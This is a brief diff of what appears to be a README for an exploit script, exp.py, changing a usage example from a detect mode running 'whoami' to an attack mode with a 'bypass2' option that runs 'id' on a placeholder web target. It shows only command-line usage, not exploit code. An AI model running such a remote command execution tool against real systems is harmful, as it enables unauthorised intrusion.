@@ -30,5 +30,5 @@ python exp.py -u http://x.x.x.x/squirt1e/ -b bypass1 -m detect
 
 
 ```
-python exp.py -u http://x.x.x.x/ -b bypass1 -m detect -c whoami
+python3 exp.py -u http://xxxx:xx/ -b bypass2 -m attack -c id
 ```
